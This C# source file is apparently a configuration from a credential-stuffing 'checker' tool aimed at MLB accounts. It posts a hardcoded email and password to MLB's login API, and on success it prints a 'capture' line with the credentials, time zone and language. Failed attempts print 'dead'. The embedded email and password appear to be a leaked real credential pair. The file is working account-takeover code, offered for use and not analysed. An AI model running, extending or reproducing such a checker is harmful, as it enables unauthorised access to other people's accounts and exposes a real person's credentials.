using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class MLB
    {
        public static void mlb()
        {
            string email = "luis_tj58@hotmail.com";
            string pass = "TgF-2010";
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                string payload = "{\"password\":\"" + pass +"\",\"username\":\"" + email +"\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":false}}";
                string send_data = req.Post("https://ids.mlb.com/api/v1/authn", payload, "application/json").ToString();
                if (send_data.Contains("status\":\"SUCCESS\",\""))
                {
                    var timeZone = Fox.Fuctions.Parsing.LR(send_data, "\"timeZone\":\"", "\"");
                    string timeZonep = String.Join(", ", timeZone);

                    var Language = Fox.Fuctions.Parsing.LR(send_data, "\"locale\":\"", "\"");
                    string Languages = String.Join(", ", Language);

                    string capture = " + " + email +  ":" + pass + " | Time Zone = " + timeZonep + " | Language = " + Languages;
                    Console.WriteLine(capture);


                }

                else if (send_data.Contains("Authentication failed") | send_data.Contains("The 'username' and 'password' attributes are required in this context."))
                {
                    Console.WriteLine("dead");

                }
                
                
                Console.ReadKey();
          

            }

        
        }
    }
}
